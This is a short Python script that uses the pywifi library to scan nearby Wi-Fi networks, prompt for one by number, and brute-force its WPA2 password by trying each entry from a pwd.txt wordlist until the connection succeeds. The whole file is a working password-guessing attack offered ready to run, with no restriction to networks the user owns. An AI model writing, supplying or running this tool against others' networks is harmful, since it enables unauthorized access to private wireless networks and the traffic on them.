import pywifi
import time
from pywifi import const
import os


# Function to read passwords from pwd.txt
def read_passwords():
    if not os.path.exists('pwd.txt'):
        print("Error: pwd.txt file not found.")
        return None
    with open('pwd.txt', 'r') as file:
        passwords = file.read().splitlines()
    return passwords


def wifi_scan():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    interface.scan()
    time.sleep(3)

    print('\rScan Completed！\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('No.', 'Strength', 'WiFi Name'))

    bss = interface.scan_results()
    wifi_name_set = set()

    for w in bss:
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)

    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)

    num = 0
    for wifi in wifi_name_list:
        print('\r{:<6d}{:<8d}{}'.format(num, wifi[0], wifi[1]))
        num += 1

    print('-' * 38)

    return wifi_name_list


def connect_to_wifi(interface, wifi_name, password):
    interface.disconnect()
    time.sleep(1)

    profile = pywifi.Profile()
    profile.ssid = wifi_name
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    interface.remove_all_network_profiles()
    profile = interface.add_network_profile(profile)

    interface.connect(profile)
    time.sleep(5)  # Wait for connection

    if interface.status() == const.IFACE_CONNECTED:
        print(f"Successfully connected to {wifi_name} with password: {password}")
        return True
    else:
        print(f"Failed to connect to {wifi_name} with password: {password}")
        return False


def attempt_wifi_connection():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]

    wifi_list = wifi_scan()
    passwords = read_passwords()

    if not passwords:
        print("Error: No passwords found in pwd.txt.")
        return

    # Prompt user to select Wi-Fi by number
    wifi_num = int(input("Select the Wi-Fi number from the list above: "))

    if wifi_num < 0 or wifi_num >= len(wifi_list):
        print("Invalid Wi-Fi number selected.")
        return

    wifi_name = wifi_list[wifi_num][1]
    print(f"Attempting to connect to {wifi_name}...")

    for password in passwords:
        success = connect_to_wifi(interface, wifi_name, password)
        if success:
            break
        else:
            print("Trying next password...")


if __name__ == "__main__":
    attempt_wifi_connection()
